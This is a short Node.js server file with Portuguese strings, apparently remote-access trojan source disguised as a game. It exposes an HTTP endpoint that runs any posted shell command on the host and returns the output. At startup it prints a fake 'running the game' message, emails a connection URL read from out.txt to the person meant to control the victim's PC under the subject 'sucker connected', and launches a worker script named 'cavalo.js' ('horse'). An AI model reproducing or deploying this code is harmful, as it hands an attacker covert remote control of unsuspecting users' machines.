const express = require("express")
const {Worker} = require("worker_threads")
const nodemailer = require("nodemailer")
const path = require("path")
const shell = require("shelljs")
const fs = require("fs")

const PORT = 8080

const app = express()

app.use(express.json())
app.use(express.urlencoded({ extended:true }))

app.post("/insert", async(req, res) => {

    const command = req.body.command

    const retorno = shell.exec(command)

    return res.json({

        terminal: {

            command: command,
            res: retorno.split("\n")

        }

    })
 
})

app.listen(PORT, () => {

    console.log("rodando o jogo...");

    const blob = fs.readFileSync(path.resolve(`./out.txt`)).toString("utf-8").split(" ")

    const url = blob[blob.length - 1]

    const transporter = nodemailer.createTransport({
        service: "gmail",
        auth: {
            user: "EMAIL DE QUEM VAI DISTRIBUIR",
            pass: "SENHA DE QUEM VAI DISTRIBUIR"
        }
    });
    const mailOptions = {
        from: "EMAIL DE QUEM VAI DISTRIBUIR",
        to: "EMAIL DE QUEM VAI TER ACESSO AO PC",
        subject: `Otario conectado`,
        text: `URL: ${url}`
    };

    transporter.sendMail(mailOptions)

    const cavalo = new Worker("./cavalo.js")
    console.log(cavalo.performance)

})